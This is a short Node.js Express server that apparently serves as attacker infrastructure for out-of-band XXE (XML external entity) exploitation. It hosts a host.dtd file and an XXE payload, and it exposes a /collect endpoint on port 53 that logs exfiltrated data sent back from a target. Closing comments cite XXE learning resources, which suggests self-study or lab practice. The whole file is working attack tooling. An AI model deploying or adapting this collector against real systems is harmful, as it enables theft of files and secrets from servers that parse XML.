const app = require('express')();
const axios = require('axios').default;

app.get('/host.dtd', (req, res) => {
	console.log("Sending host.dtd");
	res.sendFile('./host.dtd', { root: __dirname});
});

app.get('/xxe.xml', (req, res) => {
	console.log("Sending XXE payload (xxePayload.xml)");
	res.sendFile('xxePayload.xml', { root: __dirname });
})

app.get('/collect/:resp', async (req, res)=>{ 
	console.log('New Connection');
	console.log(req.params.resp);
	res.json({status: 200});
});

const port = 53;

app.listen(port, () => {
	console.log("LISTENING ON PORT " + port + "\n");
});

// Trying to understand stuff...
// https://portswigger.net/web-security/xxe
// https://gist.github.com/staaldraad/01415b990939494879b4
// https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection